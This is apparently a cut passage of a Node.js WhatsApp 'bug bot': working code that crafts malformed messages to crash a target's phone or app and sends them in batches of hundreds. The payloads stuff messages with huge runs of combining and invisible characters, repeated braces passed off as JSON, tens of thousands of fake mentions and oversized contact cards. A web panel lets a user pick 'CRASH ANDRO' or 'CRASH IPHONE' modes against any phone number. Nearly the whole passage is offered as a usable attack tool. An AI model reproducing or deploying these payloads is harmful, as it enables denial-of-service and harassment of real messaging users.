    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: sock.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await sock.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          },
          groupStatusMentionMessage: {
            groupJid: target,
            mentionedJid: randomMentions,
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {
      participant: { jid: target },
      messageId: undefined
    });

    const contacts = Array.from({ length: contactAmount }, () => ({
      displayName: `${contactName + triggerChar}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${contactName};;;\nFN:${contactName}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
    }));

    await sock.relayMessage(target, {
      contactsArrayMessage: {
        displayName: `${contactName + triggerChar}`,
        contacts,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          quotedAd: {
            advertiserName: "x",
            mediaType: "IMAGE",
            jpegThumbnail: "" 
          }
        }
      }
    }, {});

    const payloadDelay1 = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾𝗣𝗛𝗢𝗘𝗡𝗜𝗫 •𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ 𝗣𝗛𝗢𝗘𝗡𝗜𝗫 炎 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒⟅ ༑ 🩸" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", payloadDelay1, {
      messageId: null,
      statusJidList: [target]
    });

    await sock.relayMessage(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣",
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/19378731_679142228436107_2772153309284501636_n.enc?ccb=11-4&oh=...",
                mimetype: "image/jpeg",
                caption: "{ null ) } Sigma \u0000 Bokep 100030 caption: bokep",
                height: 819,
                width: 1792,
                jpegThumbnail: Buffer.from("").toString("base64"),
                mediaKey: "WedxqVzBgUBbL09L7VUT52ILfzMdRnJsjUPL0OuLUmQ=",
                mediaKeyTimestamp: "1752001602"
              },
              hasMediaAttachment: true
            },
            body: { text: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰ͯཀ͜͡🦠-‣" },
            nativeFlowMessage: {
              buttons: [
                { name: "galaxy_message", buttonParamsJson: "[".repeat(29999) },
                { name: "galaxy_message", buttonParamsJson: "{".repeat(38888) }
              ],
              messageParamsJson: "{".repeat(10000)
            },
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" }
          }
        }
      }
    }, {});

    console.log("Succes Send to target!");

  } catch (err) {
    console.error("❌ Error in function bug axgankBug:", err);
  }
}

async function CrashIp(target, sock) {
    try {
        await sock.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://Wa.me/stickerpack/Yukina`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function arrayContactXiOS(sock, target) {
  let name = "‼️⃟ ༚ 𝑹𝒂𝒍𝒅𝒛𝒛⌁𝑬𝒙𝒆𝒄𝒖𝒕𝒊𝒗𝒆⃰ ͯཀ͜͡🪅-‣";
  let trigger = "𑇂𑆵𑆴𑆿".repeat(60000);
  let amount = 100; // kalo ga ke send ganti 150/100
  let contacts = Array.from({ length: amount }, (_, i) => ({
    displayName: `${name + trigger}`,
    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${name};;;\nFN:${name}\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
  }));

  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: `${name + trigger}`,
      contacts,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: "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",
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      }
    }
  }, { participant: { jid: target } });
}

// ====== TEMPAT PEMANGGILAN FUNC & COMBO =====\\
async function androinvis(durationHours, target, sock) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
        InVisibleAndroid(sock, target, true),
        ]);
        console.log(chalk.yellow(`
┌─────────────────────────
│ ${count + 1}/400 Send Bug Invis 🕊️
└─────────────────────────
        `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`✅ Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🂡 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function androcrash(durationHours, target, sock) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([         
        crashinvis(target, sock),
        ]);
        console.log(chalk.yellow(`
┌─────────────────────────
│ ${count + 1}/400 Send Bug Crash 🕊️
└─────────────────────────
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`💀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🂡 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function Ipongcrash(durationHours, target, sock) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
        CrashIp(target, sock),
        ]);
        console.log(chalk.yellow(`
┌─────────────────────────
│ ${count + 1}/400 Crash iPhone 🕊️
└─────────────────────────
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`💀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🂡 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function Iponginvis(durationHours, target, sock) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
        arrayContactXiOS(sock, target),
        ]);
        console.log(chalk.yellow(`
┌─────────────────────────
│ ${count + 1}/400 Invis iPhone 🕊️
└─────────────────────────
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`💀 Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🂡 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SYNTHI-X APPS</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

  <style>
    :root {
      --bg:#0a0f1a;
      --card:#101628;
      --muted:#9aa4c7;
      --text:#e8ecff;
      --primary:#9b5cff;
      --secondary:#00d4ff;
      --accent:#6dd6ff;
    }

    * {box-sizing:border-box;margin:0;padding:0;}
    body {
      font-family:Poppins, sans-serif;
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background: radial-gradient(circle at 20% 20%, rgba(155,92,255,.2), transparent 30%),
                  radial-gradient(circle at 80% 10%, rgba(0,212,255,.2), transparent 25%),
                  radial-gradient(circle at 50% 90%, rgba(109,214,255,.15), transparent 30%),
                  var(--bg);
      padding:20px;
      overflow:hidden;
      position:relative;
    }

    #bgCanvas {
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      z-index:0;
      pointer-events:none;
    }

    .card {
      background: rgba(255,255,255,.05);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,.1);
      border-radius: 18px;
      padding: 22px 20px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 0 20px rgba(155,92,255,.3);
      animation: fadeIn 1s ease;
      position:relative;
      z-index:1;
    }

    @keyframes fadeIn {
      from {opacity:0; transform:translateY(20px);}
      to {opacity:1; transform:translateY(0);}
    }

    .logo {
      width:70px;
      height:70px;
      margin:0 auto 14px;
      border-radius:50%;
      object-fit:cover;
      box-shadow:0 0 16px var(--primary), 0 0 30px rgba(0,212,255,.4);
    }

    .title {
      font-size:22px;
      font-family:Orbitron, sans-serif;
      font-weight:800;
      color: var(--primary);
      margin-bottom:4px;
      text-shadow:0 0 10px rgba(155,92,255,.7);
    }

    .subtitle {
      font-size:12px;
      color: var(--muted);
      margin-bottom:20px;
    }

    input[type="text"] {
      width:100%;
      padding:12px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,.15);
      background:rgba(7,10,20,.6);
      color:var(--text);
      font-size:13px;
      outline:none;
      text-align:center;
      margin-bottom:16px;
      transition:.3s;
    }

    input:focus {
      border-color:var(--secondary);
      box-shadow:0 0 6px var(--secondary);
    }

    .buttons-grid {
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
      margin-bottom:16px;
    }

    .buttons-grid button {
      padding:12px;
      font-size:13px;
      font-weight:600;
      border:none;
      border-radius:10px;
      cursor:pointer;
      background: rgba(255,255,255,0.05);
      color: var(--text);
      border:1px solid rgba(255,255,255,.15);
      transition: all .3s ease;
    }

    .buttons-grid button:hover {
      box-shadow:0 0 12px var(--secondary);
      transform:translateY(-2px) scale(1.03);
    }

    .buttons-grid button.selected {
      background:linear-gradient(90deg, var(--primary), var(--secondary));
      color:white;
      box-shadow:0 0 12px var(--primary);
    }

    .execute-button {
      width:100%;
      padding:12px;
      font-size:14px;
      font-weight:600;
      border:none;
      border-radius:10px;
      cursor:pointer;
      background:linear-gradient(90deg, var(--primary), var(--secondary));
      color:white;
      margin-bottom:12px;
      box-shadow:0 0 10px rgba(155,92,255,.4);
      transition: all .3s ease;
    }

    .execute-button:disabled {
      opacity:.5;
      cursor:not-allowed;
    }

    .execute-button:hover:not(:disabled) {
      transform:translateY(-2px) scale(1.03);
      box-shadow:0 0 16px rgba(0,212,255,.6);
    }

    .footer-action-container {
      display:flex;
      flex-wrap:wrap;
      justify-content:center;
      align-items:center;
      gap:8px;
      margin-top:20px;
    }

    .footer-button {
      background: rgba(255,255,255,0.05);
      border:1px solid var(--primary);
      border-radius:8px;
      padding:8px 12px;
      font-size:14px;
      color: var(--primary);
      display:flex;
      align-items:center;
      gap:6px;
      transition: background .3s ease;
    }

    .footer-button:hover {
      background: rgba(155,92,255,.2);
    }

    .footer-button a {
      text-decoration:none;
      color: var(--primary);
      display:flex;
      align-items:center;
      gap:6px;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -60%) scale(0.9);
      background: rgba(16, 22, 40, 0.95);
      color: var(--secondary);
      padding: 12px 18px;
      border-radius: 12px;
      border: 1px solid rgba(0, 212, 255, 0.35);
      box-shadow: 0 0 12px rgba(0, 212, 255, 0.5), 0 0 25px rgba(155, 92, 255, 0.15);
      font-weight: 600;
      font-size: 14px;
      display: none;
      z-index: 9999;
      animation: zoomFade 3s ease forwards;
      text-align: center;
      font-family: "Poppins", sans-serif;
      letter-spacing: 0.4px;
      backdrop-filter: blur(8px);
      text-shadow: 0 0 6px rgba(0, 212, 255, 0.5);
    }

    @keyframes zoomFade {
      0% { opacity:0; transform: translate(-50%, -50%) scale(0.8); filter: blur(5px);}
      15% { opacity:1; transform: translate(-50%, -50%) scale(1); filter: blur(0);}
      85% { opacity:1; transform: translate(-50%, -50%) scale(1); filter: blur(0);}
      100% { opacity:0; transform: translate(-50%, -50%) scale(0.8); filter: blur(5px);}
    }
  </style>
</head>
<body>
  <canvas id="bgCanvas"></canvas>

  <div class="card">
    <img src="https://e.top4top.io/p_3501jjn601.jpg" class="logo" alt="Logo">
    <div class="title">Synthix - Trashed</div>
    <div class="subtitle">Choose mode & target number</div>

    <input type="text" placeholder="Please Input Target Number 628xx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
      <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> INVIS ANDRO</button>
      <button class="mode-btn" data-mode="invis-iphone"><i class="fas fa-dumpster-fire"></i> INVIS IPHONE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>

    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/vinzxiterr" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
      </div>
      <div class="footer-button">
        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
      </div>
    </div>
  </div>

  <div id="popup" class="popup"> <i class="fa-solid fa-bolt"></i> Success Send Bug </div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      popup.style.display = "block";
      setTimeout(() => {
        popup.style.display = "none";
        window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
      }, 3000);
    });

    // Particle Background Animation
    const canvas = document.getElementById("bgCanvas");
    const ctx = canvas.getContext("2d");
    let particles = [];
    
    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      const count = window.innerWidth < 600 ? 60 : 120;
      particles = [];
      for (let i=0; i<count; i++) {
        particles.push({
          x: Math.random()*canvas.width,
          y: Math.random()*canvas.height,
          vx: (Math.random()-0.5)*1,
          vy: (Math.random()-0.5)*1,
          r: 1.2,
          color: Math.random() > 0.5 ? 'rgba(155,92,255,0.8)' : 'rgba(0,212,255,0.8)'
        });
      }
    }
    
    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      for (let p of particles) {
        p.x += p.vx;
        p.y += p.vy;
        if (p.x<0 || p.x>canvas.width) p.vx *= -1;
        if (p.y<0 || p.y>canvas.height) p.vy *= -1;
        
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, 2*Math.PI);
        ctx.fillStyle = p.color;
        ctx.fill();
      }
      
      for (let i=0; i<particles.length; i++) {
        for (let j=i+1; j<particles.length; j++) {
          let dx = particles[i].x - particles[j].x;
          let dy = particles[i].y - particles[j].y;
          let dist = Math.sqrt(dx*dx + dy*dy);
          if (dist < 120) {
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            let gradient = ctx.createLinearGradient(particles[i].x, particles[i].y, particles[j].x, particles[j].y);
            gradient.addColorStop(0, 'rgba(155,92,255,0.3)');
            gradient.addColorStop(1, 'rgba(0,212,255,0.3)');
            ctx.strokeStyle = gradient;
            ctx.lineWidth = 0.4;
            ctx.stroke();
          }
        }
      }
      
      requestAnimationFrame(animate);
    }
    
    window.addEventListener("resize", resizeCanvas);
    resizeCanvas();
    animate();
  </script>
</body>
</html>`;
};



